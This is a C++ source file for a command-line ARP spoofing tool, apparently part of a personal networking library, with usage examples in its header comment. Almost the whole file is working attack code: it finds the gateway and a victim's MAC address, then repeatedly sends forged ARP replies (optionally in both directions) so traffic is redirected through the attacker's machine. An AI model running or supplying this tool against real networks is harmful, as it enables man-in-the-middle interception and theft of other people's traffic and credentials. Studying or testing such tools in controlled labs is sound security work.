//
// Created by kenny on 2/14/19.
//
/*
 * arp-spoof - perform LAN arp spoofing on a given host
 *
 * -t attack both gateway and the given host
 *
 * -n [seconds] between two packet
 *
 * -c [count] of packets to be sent
 *
 * -e [iface] device name
 *
 * sudo KNI_DEVNAME=wlan0
 * sudo arp-spoof 192.168.43.79 -c 5
 *
 * TODO Resolve MAC address for unknown hosts
 */

#include "hdrs.h"
#include "arpspf.h"


bool keep_running = true;

void signal_stop_running(int);

int main(int argc, char *argv[]) {
    // Install function to catch ctrl+c
    struct sigaction sig_int_handler; // NOLINT

    sigemptyset(&sig_int_handler.sa_mask);
    sig_int_handler.sa_handler = signal_stop_running;
    sig_int_handler.sa_flags = 0;

    if (sigaction(SIGINT, &sig_int_handler, NULL) == -1)
        KNI_FATAL_ERROR("Can not install interrupt handler: %s", strerror(errno));

    // Parse options
    int opt;
    int seconds = 10, npackets = -1;
    bool twoway = false;
    const char *devname = nullptr;
    kni::mac_t disguised_mac{};

    while ((opt = getopt(argc, argv, "n:c:t:e:i:")) != -1) {
        switch (opt) {
            case 'n':
                seconds = atoi(optarg);
                break;
            case 'c':
                npackets = atoi(optarg);
                break;
            case 't':
                twoway = true;
                break;
            case 'e':
                devname = optarg;
                break;
            case 'i':
                if (kni::mac_pton(optarg, &disguised_mac) == 0)
                    KNI_FATAL_ERROR("Invalid MAC address. Use device's address by default");
                break;
            default:
                break;
        }
    }

    argc -= optind;
    argv += optind;

    if (seconds <= 0)
        KNI_FATAL_ERROR("Invalid arguments.");

    if (argc == 0)
        KNI_FATAL_ERROR("Missing an IP address.");

    if (devname == nullptr)
        KNI_FATAL_ERROR("Missing device name.");


    char errbuf[PCAP_ERRBUF_SIZE] = {0};

    // Get device info
    kni::devinfo_t devinfo;
    if (kni::get_device_info(devname, &devinfo, errbuf) == -1)
        KNI_FATAL_ERROR("unable to obtain device info: %s", errbuf);
    else if (kni::to_string(disguised_mac) == "00:00:00:00:00:00")
        disguised_mac = devinfo.hw_addr;

    // Get gateway ip
    auto gw = kni::get_gateway_ip(devname);
    if (gw == -1)
        KNI_FATAL_ERROR("unable to obtain gateway IP: %s", strerror(errno));
    auto gateway_ip = kni::to_string(*(kni::ipv4_t *) &gw);

    // Gateway can be found via "arp -n" on success
    kni::arp_map arp;
    if (!kni::fetch_cached_arp(arp))
        KNI_FATAL_ERROR("unable to obtain ARP info: %s", strerror(errno));

    int temp;
    if (inet_pton(AF_INET, argv[0], &temp) == 0)
        KNI_FATAL_ERROR("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
    else if (!arp.count(argv[0])) {
        // Host is not found in system cache
        // Use nmap to discover host
        if (!kni::query_lan_arp(argv[0], arp))
            KNI_FATAL_ERROR("unable to detect host: %s", strerror(errno));
        else if (!arp.count(argv[0])) {
            KNI_LOG_DEBUG("ARP size=%lu", arp.size());
            for (auto &kv: arp) {
                KNI_LOG_DEBUG("ip:%s -> mac:%s", kv.first.c_str(), kni::to_string(kv.second).c_str());
            }
            KNI_FATAL_ERROR("Host %s not detected.", argv[0]);
        }

    }

    std::string victim_ip = argv[0];
    auto victim_mac = arp[victim_ip];
    kni::arp_io_packet arp_io;

    if (!arp_io.open(devname))
        KNI_FATAL_ERROR("failed to open device \"%s\" :%s", devname, arp_io.err());
    else
        KNI_LOG_DEBUG("device \"%s\" opened successfully.", devname);

    KNI_LOG_DEBUG("ip=%s secs=%d pkts=%d twoway=%d", victim_ip.c_str(), seconds, npackets, twoway);

    KNI_PRINTLN("Disguised as %s(%s).", gateway_ip.c_str(), kni::to_string(disguised_mac).c_str());
    KNI_PRINTLN("Attacking %s(%s)...", victim_ip.c_str(), kni::to_string(victim_mac).c_str());

    int count = 0;
    while (keep_running) {
        auto succ = arp_io.reply(gateway_ip, disguised_mac, victim_ip, victim_mac);
        if (succ && twoway)
            succ = arp_io.reply(victim_ip, victim_mac, gateway_ip, disguised_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io.err());

        if (++count == npackets) // If npackets < 0 then it becomes an infinite loop
            break;
        else
            sleep(static_cast<unsigned int>(seconds));
    }

    arp_io.close();
    KNI_PRINT("\nDevice closed.");

    return 0;
}


void signal_stop_running(int) {
    keep_running = false;
}
